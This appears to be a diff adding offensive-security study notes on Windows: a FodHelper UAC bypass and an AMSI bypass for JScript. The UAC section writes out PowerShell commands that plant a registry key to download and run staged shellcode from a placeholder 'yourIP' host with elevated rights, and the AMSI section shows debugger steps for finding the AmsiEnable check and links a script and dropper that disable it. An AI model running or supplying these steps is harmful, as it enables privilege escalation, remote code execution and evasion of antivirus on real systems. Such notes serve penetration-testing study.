@@ -235,3 +235,70 @@ Evaluate expression: 140713022928224 = 00007ffa`4dbf3560
 amsi!AmsiOpenSession:
 00007ffa`4dbf3560 4885d2          test    rdx,rdx
 ```
+## FodHelper UAC Bypass case Study,  Privilege Escalation attack
+
+[Fodhelper.exe](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/) is a Win 10 application that manage optional features like region-specific keyboard settings. The application run as high integrity. It interacts with HKCU registry. This allow us ti create registry key and add DelegateExecute value. The below example, run.txt is staged shellcode.
+
+```
+PS C:\Users\mst> New-Item -Path HKCU:\Software\Classes\mssettings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://yourIP/run.txt') | IEX" -Force
+
+PS C:\Users\mst> New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+
+PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe
+```
+
+## AMSI bypass witj JScript
+
+We  create a Jscript test file with sleep enable.This allow us time to locate and attach the Wscript process before the script finish execution. 
+```
+WScript.Sleep(20000);
+var WshShell = new ActiveXObject("WScript.Shell");
+WshShell.Run("calc")
+```
+again we can use frida-trace to track the process flow, we notices that jscript call AmsiScanString and AmsiScanBuffer but not AmsiOpenSession
+```
+C:\Users\mst> frida-trace -p 708 -x amsi.dll -i Amsi*
+Started tracing 9 functions. Press Ctrl+C to stop.
+/* TID 0x144c */
+12118 ms AmsiScanString()
+12118 ms | [*] AmsiScanBuffer()
+12118 ms | |- amsiContext: 0x28728e17c80
+12118 ms | |- buffer: IHost.Sleep("20000");
+IWshShell3.Run("calc");
+12118 ms | |- length: 0x60
+12118 ms | |- contentName 0x28728e35f08
+12118 ms | |- amsiSession 0x0
+12118 ms | |- result 0xf97dafdc00
+12128 ms | [*] AmsiScanBuffer() Exit
+12128 ms | |- Result value is: 1
+
+```
+
+Jscript tries to query the “AmsiEnable” registry key from the HKCU hive before initializing AMSI. If this key is set to “0”, AMSI is not
+enabled for the Jscript process. This query is performed in **JAmsi::JAmsiIsEnabledByRegistry** function inside **Jscript.dll**, which
+is only called when wscript.exe is started.
+
+We can use win debug to set a break point on jscript!JAmsi::JAmsiIsEnabledByRegistry, and watch examine the memory address
+```
+0:000> bu jscript!JAmsi::JAmsiIsEnabledByRegistry
+0:000> g
+
+0:000> u rip L20
+00007fff`a3a868f1 488d15e8cb0800 lea rdx,[jscript!`string' (00007fff`a3b134e0)]
+00007fff`a3a868ff ff15f3a60800 call qword ptr [jscript!_imp_RegOpenKeyExW
+
+00007fff`a3a86932 488d1587cb0800 lea rdx,[jscript!`string' (00007fff`a3b134c0)]
+00007fff`a3a86939 ff15b1a60800 call qword ptr [jscript!_imp_RegQueryValueExW(00007fff`a3b10ff0)]
+```
+
+query the desire location
+```
+0:000> du 00007fff`a3b134e0
+00007fff`a3b134e0 "SOFTWARE\Microsoft\Windows Scrip"
+00007fff`a3b13520 "t\Settings"
+
+0:000> du 7fff`a3b134c0
+00007fff`a3b134c0 "AmsiEnable"
+```
+
+Putting everything togther, we can write [DisableAmsi.js](/05FightAdvancedAntivirus/DisableAmsi.js)  to set register key to 0. Or you can run this [all in on js dropper](/05FightAdvancedAntivirus/DisableAmsiReg.js)
